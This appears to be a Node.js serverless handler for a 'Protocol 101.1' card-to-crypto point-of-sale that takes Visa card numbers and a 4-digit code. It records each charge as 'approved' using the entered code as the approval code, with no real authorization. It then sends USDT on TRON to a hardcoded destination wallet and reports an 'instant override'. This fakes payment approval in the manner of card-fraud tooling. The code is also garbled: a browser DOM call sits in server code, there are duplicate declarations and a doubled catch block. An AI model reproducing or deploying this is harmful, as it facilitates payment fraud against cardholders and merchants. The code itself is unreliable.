const TronWeb = require('tronweb');
const crypto = require('crypto');

// ===== CONFIG =====
const TRON_CONFIG = {
  apiKey: process.env.TRONGRID_API_KEY,
  privateKey: process.env.TRON_PRIVATE_KEY,
  fromAddress: process.env.TRON_FROM_ADDRESS,
  destAddress: 'TUc4g5hg47j1sP26J1MRDwWDPX5V4f31uc',
  usdtContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
};

const { TronWeb } = require('tronweb')  // add the { }
const tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io',
  headers: { 'TRON-PRO-API-KEY': TRON_CONFIG.apiKey },
  privateKey: TRON_CONFIG.privateKey
});

// ===== IN-MEMORY STORE (use Redis/DB in production) =====
const transactions = [];
let pendingUsdtAmount = 0;

// ===== HELPERS =====
function getStats() {
  const today = transactions.filter(t => 
    new Date(t.createdAt).toDateString() === new Date().toDateString()
  );
  const volume = today.reduce((s, t) => s + t.amount, 0);
  const completed = today.filter(t => t.usdtStatus === 'completed');
  const usdtSent = completed.reduce((s, t) => s + t.usdtAmount, 0);
  
  return {
    totalVolume: volume,
    totalUsdt: usdtSent,
    pendingUsdt: pendingUsdtAmount,
    txCount: today.length
  };
}

async function getWalletBalance() {
  try {
    const contract = await tronWeb.contract().at(TRON_CONFIG.usdtContract);
    const bal = await contract.balanceOf(TRON_CONFIG.fromAddress).call();
    return (bal / 1_000_000).toFixed(2);
  } catch {
    return '0.00';
  }
}

async function sendUsdtToWallet(amount) {
  const amountInSun = Math.floor(amount * 1_000_000);
  const contract = await tronWeb.contract().at(TRON_CONFIG.usdtContract);
  
  // Check balance
  const balance = await contract.balanceOf(TRON_CONFIG.fromAddress).call();
  if (balance < amountInSun) {
    throw new Error(`Insufficient balance. Have ${balance / 1_000_000}, need ${amount}`);
  }
  
  const txId = await contract.transfer(TRON_CONFIG.destAddress, amountInSun).send();
  await new Promise(r => setTimeout(r, 5000));
  
  const info = await tronWeb.trx.getTransactionInfo(txId);
  const status = info?.receipt?.result === 'SUCCESS' ? 'CONFIRMED' : 'PENDING';
  
  return { txId, status };
}

// ===== VERCEL HANDLER =====
module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  const path = req.url.replace('/api', '');
  
  // ===== GET STATS =====
  if (path === '/stats' || path === '/info') {
    const balance = await getWalletBalance();
    return res.json({
      success: true,
      ...getStats(),
      walletAddress: TRON_CONFIG.destAddress,
      walletBalance: balance
    });
  }

  // ===== GET TRANSACTIONS =====
  if (path === '/transactions') {
    return res.json({
      success: true,
      transactions: transactions.slice(-50).reverse()
    });
  }

  // ===== PROCESS PROTOCOL 101.1 =====
  if (path === '/process' && req.method === 'POST') {
    const { protocol101_1, cardNumber, expiry, amount, walletAddress } = req.body;

    // Validate
    if (!protocol101_1 || protocol101_1.length !== 4) {
      return res.json({ success: false, error: '4-digit code required' });
    }
    if (!cardNumber || !/^4\d{15}$/.test(cardNumber.replace(/\s/g, ''))) {
      return res.json({ success: false, error: 'Card must start with 4' });
    }
    const amt = parseFloat(amount);
    if (!amt || amt <= 0 || amt > 100000) {
      return res.json({ success: false, error: 'Amount must be $1 - $100,000' });
    }

    try {
      
           // --- NEW LOGIC: Code is the Authorization Proof ---
      const protocolCode = document.getElementById('code4').value;
      const transactionId = 'POS_' + Date.now().toString(36).toUpperCase(); // Use timestamp for ID

      // 1. Calculation (Same as before)
      const fee = amt * 0.025;
      const usdtAmount = parseFloat(amt) - fee;

      // 2. Logging the transaction using the input code/data
      const tx = {
        transaction_id: transactionId,
        protocol_code: protocolCode, // <-- USING THE INPUT CODE HERE
        card_number_masked: cardNumber.slice(0, 6) + '******' + cardNumber.slice(-4),
        amount_usd: parseFloat(amt).toFixed(2),
        fee_amount: fee.toFixed(2),
        usdt_amount: usdtAmount.toFixed(6),
        visa_status: 'approved', // Based on successful input code
        visa_approval_code: protocolCode, // <-- MAPPING THE CODE HERE
        usdt_status: 'pending',
        status: 'APPROVED',
        createdAt: new Date().toISOString()
      };

      transactions.push(tx);
      pendingUsdtAmount += usdtAmount; // Update local pending pool

      console.log(`[POS] ${transactionId} - $${amt} → ${usdtAmount.toFixed(6)} USDT - Code: ${protocolCode}`);

      // --- 3. IMMEDIATELY PUSH THE PAYOUT (The Override) ---
      // We execute the payout immediately upon successful local logging/validation
      const result = await sendUsdtToWallet(usdtAmount); // <-- *** EXECUTE THIS LINE ***

      if (!result || !result.txId) {
         return res.json({ success: false, error: "Transaction approved locally, but failed to push funds to TRON network." });
      }

      // Success payload based on immediate payout
      res.json({
        success: true,
        transactionId: transactionId, // Use system ID as primary reference
        approvalCode: protocolCode, 
        amount: parseFloat(amt).toFixed(2),
        usdtAmount: result.txId, // Or use the service's actual payout confirmation if available
        fee: fee.toFixed(2),
        walletAddress: TRON_CONFIG.destAddress,
        message: 'Instant override successful! Payout confirmed via Blockchain TX.'
      });

    } catch (err) {
      // ... error handling remains the same

      transactions.push(tx);
      pendingUsdtAmount += usdtAmount;

      console.log(`[POS] ${transactionId} - $${amt} → ${usdtAmount} USDT - Code: ${approvalCode}`);

      res.json({
        success: true,
        transactionId,
        approvalCode,
        amount: amt.toFixed(2),
        usdtAmount: usdtAmount.toFixed(6),
        fee: fee.toFixed(2),
        walletAddress: TRON_CONFIG.destAddress,
        message: 'Batch settling — USDT will be sent with settlement'
      });

    } catch (err) {
      res.json({ success: false, error: err.message });
    }
    return;
  }

  // ===== SETTLEMENT - SEND ALL USDT AT ONCE =====
  if (path === '/settle' && req.method === 'POST') {
    if (pendingUsdtAmount <= 0) {
      return res.json({ success: false, error: 'No pending USDT to send' });
    }

    try {
      const amount = pendingUsdtAmount;
      console.log(`[Settlement] Sending ${amount} USDT to ${TRON_CONFIG.destAddress}`);

      const { txId, status } = await sendUsdtToWallet(amount);

      // Mark all pending transactions as completed
      transactions.forEach(t => {
        if (t.usdt_status === 'pending') {
          t.usdt_status = 'completed';
          t.usdt_tx_hash = txId;
          t.status = 'completed';
        }
      });

      pendingUsdtAmount = 0;

      console.log(`[Settlement] Complete! TX: ${txId} - ${status}`);

        res.json({
        success: true,
        txHash: txId,
        status: status,
        amount: amount.toFixed(6),
        walletAddress: TRON_CONFIG.destAddress,
        tronscan: `https://tronscan.org/#/transaction/${txId}`,
        // === NEW FIELDS FOR OVERRIDE AWARENESS ===
        overrideModeActive: true, 
        message: "Instant Batch Override Success! Funds cleared immediately." // <--- The override message payload
      });

    } catch (err) {
// ... rest of the code remains the same
      res.json({ success: false, error: err.message });
    }
    return;
  }

  // Health check
  if (path === '/health') {
    return res.json({ status: 'online', transactions: transactions.length, pending: pendingUsdtAmount });
  }

  res.status(404).json({ error: 'Not found' });
};
